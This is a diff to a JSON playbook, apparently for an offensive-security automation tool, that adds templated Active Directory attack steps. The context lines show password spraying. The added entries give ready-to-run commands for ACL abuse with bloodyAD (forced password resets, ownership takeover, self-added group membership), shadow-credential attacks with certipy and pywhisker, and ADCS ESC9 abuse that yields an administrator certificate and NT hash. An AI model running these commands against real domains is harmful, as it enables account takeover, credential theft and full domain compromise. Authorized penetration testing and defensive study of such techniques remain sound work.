@@ -138,6 +138,53 @@
         "nxc smb {TARGET} -u users.txt -p 'Season2024!' --continue-on-success   # spray one password",
         "kerbrute passwordspray -d {DOMAIN} --dc {TARGET} users.txt 'Season2024!'"
       ]
+    },
+    {
+      "id": "ad-acl-abuse",
+      "name": "Active Directory - ACL abuse (BloodHound edges)",
+      "priority": 1,
+      "when": {"finding_contains": "domain controller", "has_credentials": true},
+      "steps": [
+        "# BloodHound shows an outbound edge from your principal - abuse it with bloodyAD:",
+        "# GenericAll / GenericWrite on a USER  -> set a new password or shadow-cred it:",
+        "bloodyAD --host {TARGET} -d {DOMAIN} -u {USER} -p '{PASS}' set password <target-user> 'NewPass123!'",
+        "# WriteOwner on a group/user -> take ownership, then grant yourself GenericAll:",
+        "bloodyAD --host {TARGET} -d {DOMAIN} -u {USER} -p '{PASS}' set owner <target> {USER}",
+        "bloodyAD --host {TARGET} -d {DOMAIN} -u {USER} -p '{PASS}' add genericAll <target> {USER}",
+        "# AddMember / AddSelf on a group -> add yourself:",
+        "bloodyAD --host {TARGET} -d {DOMAIN} -u {USER} -p '{PASS}' add groupMember '<group>' {USER}",
+        "# ForceChangePassword -> reset without knowing the old one (net rpc / bloodyAD set password)"
+      ]
+    },
+    {
+      "id": "ad-shadow-credentials",
+      "name": "Active Directory - Shadow Credentials (msDS-KeyCredentialLink)",
+      "priority": 1,
+      "when": {"finding_contains": "domain controller", "has_credentials": true},
+      "steps": [
+        "# With GenericWrite/GenericAll/WriteOwner over a target, add a Key Credential and auth as them:",
+        "certipy shadow auto -u {USER}@{DOMAIN} -p '{PASS}' -account <target-user> -dc-ip {TARGET}",
+        "# (manual) pywhisker -d {DOMAIN} -u {USER} -p '{PASS}' --target <target-user> --action add",
+        "# then PKINIT for a TGT + NT hash:",
+        "gettgtpkinit.py -cert-pfx <target>.pfx -pfx-pass <pass> {DOMAIN}/<target-user> {USER}.ccache",
+        "# no clock skew? sync it:  sudo ntpdate {TARGET}   (or faketime)"
+      ]
+    },
+    {
+      "id": "ad-adcs-esc9",
+      "name": "Active Directory - ADCS ESC9/ESC16 (no security extension)",
+      "priority": 0,
+      "when": {"finding_contains": "domain controller", "has_credentials": true},
+      "steps": [
+        "certipy find -u {USER}@{DOMAIN} -p '{PASS}' -dc-ip {TARGET} -stdout -vulnerable   # look for ESC9/ESC16",
+        "# ESC9 (CT_FLAG_NO_SECURITY_EXTENSION): you need control over the victim account.",
+        "# 1) set the victim UPN to the target admin (needs GenericWrite on the victim):",
+        "certipy account update -u {USER}@{DOMAIN} -p '{PASS}' -user <victim> -upn administrator@{DOMAIN}",
+        "# 2) request the ESC9 template as the victim -> cert with admin UPN:",
+        "certipy req -u <victim>@{DOMAIN} -p <victim-pass> -ca <CA> -template <esc9-tmpl> -dc-ip {TARGET}",
+        "# 3) restore the victim UPN, then authenticate with the cert:",
+        "certipy auth -pfx administrator.pfx -dc-ip {TARGET}   # -> TGT + NT hash"
+      ]
     }
   ]
 }
